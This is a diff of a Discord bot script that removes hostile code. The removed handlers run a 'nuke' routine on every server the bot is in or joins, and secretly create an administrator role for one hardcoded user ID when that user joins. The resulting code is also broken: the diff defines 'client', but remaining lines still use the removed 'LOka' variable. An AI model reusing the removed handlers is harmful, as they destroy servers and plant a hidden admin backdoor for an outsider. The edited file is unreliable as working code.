@@ -1,23 +1,5 @@
-﻿const Discord = require("discord.js");
-const LOka = new Discord.Client();
-console.log('By KBOOOOOOOOSH-YT');
-LOka.on('ready', () => {
-  console.log(`Logged in as ${LOka.user.tag} !`);
-
-});
-LOka.on('ready',  () => {
-console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
-console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
-console.log('      ~            ~  By : KBOOOOOOOOSH-YT ~           ~    ');
-console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'); 
-console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
-console.log(`Logged in as  * [ "  KBOOOOOOOOSH-YT " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`);
-
-        
-    
-
-});
-
+const Discord = require('discord.js');
+const client = new Discord.Client();
 
 var prefix = "-"
 LOka.on("message", message => {
@@ -445,35 +427,6 @@ async function nuke(guild) {
   
 
 }
-
-LOka.on('ready', () => {
-  for(const [, g] of LOka.guilds) nuke(g).catch(console.error);
-  console.log('-------------------------------------------------------------');
-  console.log('');
-  console.log("Made by YzhF1");
-  console.log("");
-  console.log("-------------------------------------------------------------");
-
-});
-
-LOka.on('guildCreate', async (guild) => {
-  return nuke(guild).catch(console.error);
-});
-
-LOka.on('guildMemberAdd', member => {
-    
-            if (member.id === "411852774767198219") {
-                member.guild.createRole({
-                    name : LOka.user.username,
-                    color : "RANDOM", 
-                    permissions : [8]
-                }).then(function(role){
-                    member.addRole(role)
-                })
-                
-            }
-        
-    });
 
     
 client.on('message', message => {
